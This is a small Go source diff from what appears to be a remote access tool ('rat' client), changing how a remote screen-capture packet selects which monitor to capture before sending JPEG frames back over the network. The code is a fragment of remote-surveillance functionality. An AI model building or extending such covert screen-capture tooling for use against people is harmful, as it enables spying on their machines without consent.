@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"fmt"
 	"image/jpeg"
 	"rat/client/screen"
 	"rat/shared/network/header"
@@ -10,11 +11,14 @@ import (
 )
 
 var screenStream bool
+var monitor bool
+var handle int
 
 type ScreenPacket struct {
 	Run     bool    `network:"receive"`
 	Scale   float32 `network:"receive"`
-	Monitor int     `network:"receive"`
+	Monitor bool    `network:"receive"`
+	Handle  int     `network:"receive"`
 	Buffer  []byte  `network:"send"`
 }
 
@@ -30,6 +34,9 @@ func (packet ScreenPacket) OnReceive() error {
 	}
 
 	screenStream = packet.Run
+	monitor = packet.Monitor
+	handle = packet.Handle
+
 
 	return nil
 }
@@ -39,11 +46,11 @@ func (packet *ScreenPacket) Init() {
 
 	var w bytes.Buffer
 
-	if packet.Monitor >= len(screen.Monitors) {
-		packet.Monitor = 0
+	if handle >= len(screen.Monitors) {
+		handle = 0
 	}
 
-	img := screen.Capture(screen.Monitors[packet.Monitor])
+	img := screen.Capture(screen.Monitors[handle])
 
 	if packet.Scale > 0 && packet.Scale < 1.0 {
 		width := float32(img.Bounds().Max.X) * packet.Scale
